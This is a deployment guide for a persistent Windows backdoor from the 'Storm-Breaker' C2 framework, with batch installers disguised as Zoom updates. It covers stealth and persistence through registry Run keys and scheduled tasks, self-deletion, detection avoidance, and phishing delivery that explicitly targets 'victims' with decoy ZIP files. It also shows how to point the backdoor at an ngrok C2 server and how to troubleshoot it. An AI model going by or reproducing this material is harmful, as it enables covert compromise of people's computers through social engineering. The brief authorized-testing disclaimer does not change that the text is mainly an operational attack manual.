# Storm-Breaker Persistent Backdoor Deployment Guide

## Overview
This directory contains multiple versions of the backdoor installer, each with different levels of stealth and persistence.

## Available Versions

### 1. ZoomConsole_Setup.bat (Original)
**Stealth Level:** Low
**Persistence:** None
- Runs in a minimized window
- Visible in Task Manager as PowerShell process
- Stops when user logs out or closes the window
- **Use Case:** Testing and debugging

### 2. ZoomConsole_Setup_Silent.bat (Silent Installer)
**Stealth Level:** Medium
**Persistence:** High
- Completely hidden (no visible window)
- Creates VBScript launcher for stealth
- Adds to Windows startup (Registry)
- Survives reboots
- Self-deletes after installation
- **Use Case:** Standard deployment

**How it works:**
1. Creates PowerShell script in `%APPDATA%\Microsoft\Windows\ZoomService.ps1`
2. Creates VBScript launcher in `%APPDATA%\Microsoft\Windows\ZoomUpdate.vbs`
3. Adds VBScript to startup registry key
4. Launches immediately in hidden mode
5. Deletes the installer batch file

### 3. ZoomConsole_Setup_TaskScheduler.bat (Advanced Persistent)
**Stealth Level:** High
**Persistence:** Maximum
- Completely hidden (no visible window)
- Uses Windows Task Scheduler for maximum persistence
- Multiple persistence mechanisms (Task Scheduler + Registry)
- Automatic restart on failure
- Runs at logon and every 5 minutes
- Runs with highest privileges
- Self-deletes after installation
- **Use Case:** Long-term persistent access

**How it works:**
1. Creates PowerShell script in `%APPDATA%\Microsoft\Windows\ZoomService.ps1`
2. Creates two scheduled tasks:
   - `ZoomUpdateService`: Runs at logon
   - `ZoomUpdateCheck`: Runs every 5 minutes (backup)
3. Adds to startup registry as additional backup
4. Starts immediately
5. Deletes the installer batch file

## Deployment Instructions

### Method 1: Direct Execution (Requires User Interaction)
1. Victim downloads the `.bat` file
2. Victim double-clicks to run
3. Backdoor installs and self-deletes

### Method 2: Social Engineering Package
1. Package the `.bat` file in a ZIP with a decoy document
2. Name it something legitimate (e.g., "Zoom_Security_Update.zip")
3. Victim extracts and runs the batch file

### Method 3: Via Storm-Breaker Web Panel
1. Upload the desired `.bat` file to the web panel
2. Generate a phishing link
3. Victim downloads and executes

## Persistence Mechanisms Explained

### Registry Startup
- **Location:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Key Name:** `ZoomUpdate`
- **Triggers:** Every user logon
- **Removal:** Requires manual registry editing

### Task Scheduler (Advanced Version Only)
- **Task Names:** `ZoomUpdateService`, `ZoomUpdateCheck`
- **Triggers:** 
  - At logon
  - Every 5 minutes
- **Privileges:** Highest available
- **Removal:** Requires Task Scheduler access

## Stealth Features

### Hidden Execution
- No visible windows (uses `-WindowStyle Hidden`)
- VBScript launcher runs with `0` window style
- No console flashing

### Legitimate Naming
- Files named after Zoom to appear legitimate
- Uses Windows system directories (`%APPDATA%\Microsoft\Windows`)

### Process Disguise
- Runs as `powershell.exe` (common Windows process)
- No suspicious process names

## Detection Avoidance

### What Makes It Stealthy:
1. **No visible windows** - User sees nothing
2. **Legitimate file locations** - Hidden in Windows directories
3. **Common process names** - Blends with normal Windows processes
4. **Multiple persistence** - Hard to completely remove
5. **Self-deletion** - No installer traces

### Potential Detection Points:
1. **Antivirus** - May flag PowerShell network activity
2. **Task Manager** - PowerShell process visible (but common)
3. **Network monitoring** - Outbound HTTPS connections
4. **Registry monitoring** - Startup entry creation
5. **Task Scheduler** - Scheduled tasks visible to admins

## Removal Instructions (For Testing)

### Remove Silent Version:
```batch
:: Delete files
del "%APPDATA%\Microsoft\Windows\ZoomService.ps1"
del "%APPDATA%\Microsoft\Windows\ZoomUpdate.vbs"

:: Remove registry entry
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ZoomUpdate" /f

:: Kill running process
taskkill /F /IM powershell.exe /FI "WINDOWTITLE eq ZoomService*"
```

### Remove Task Scheduler Version:
```batch
:: Delete files
del "%APPDATA%\Microsoft\Windows\ZoomService.ps1"

:: Remove scheduled tasks
schtasks /delete /tn "ZoomUpdateService" /f
schtasks /delete /tn "ZoomUpdateCheck" /f

:: Remove registry entry
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ZoomUpdate" /f

:: Kill running process
taskkill /F /IM powershell.exe /FI "WINDOWTITLE eq ZoomService*"
```

## Configuration

To change the C2 server URL, edit the `SERVER` variable in the batch file:
```batch
set "SERVER=https://your-ngrok-url.ngrok-free.dev"
```

## Security Considerations

### For Penetration Testing:
- ✅ Always have written authorization
- ✅ Document all deployments
- ✅ Provide removal instructions to client
- ✅ Clean up after testing

### For Red Team Operations:
- ✅ Follow rules of engagement
- ✅ Maintain operational security
- ✅ Use appropriate version for scenario
- ✅ Monitor for detection

## Troubleshooting

### Backdoor Not Connecting:
1. Check if C2 server is running
2. Verify ngrok URL is correct
3. Check firewall settings
4. Verify PowerShell execution policy

### Backdoor Not Persisting:
1. Check if scheduled tasks were created: `schtasks /query /tn ZoomUpdateService`
2. Check registry entry: `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ZoomUpdate`
3. Check if files exist in `%APPDATA%\Microsoft\Windows\`

### Process Keeps Dying:
1. Check antivirus logs
2. Verify network connectivity
3. Check PowerShell execution policy
4. Review Windows Event Logs

## Recommendations

### For Maximum Stealth:
Use **ZoomConsole_Setup_TaskScheduler.bat**
- Multiple persistence mechanisms
- Automatic restart
- Highest privileges

### For Quick Testing:
Use **ZoomConsole_Setup.bat**
- Easy to stop and restart
- Visible for debugging
- No persistence to clean up

### For Standard Deployment:
Use **ZoomConsole_Setup_Silent.bat**
- Good balance of stealth and simplicity
- Single persistence mechanism
- Easy to understand

## Legal Disclaimer

These tools are provided for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security assessments.

---

**Created for Storm-Breaker C2 Framework**
**Version:** 2.0
**Last Updated:** December 2025
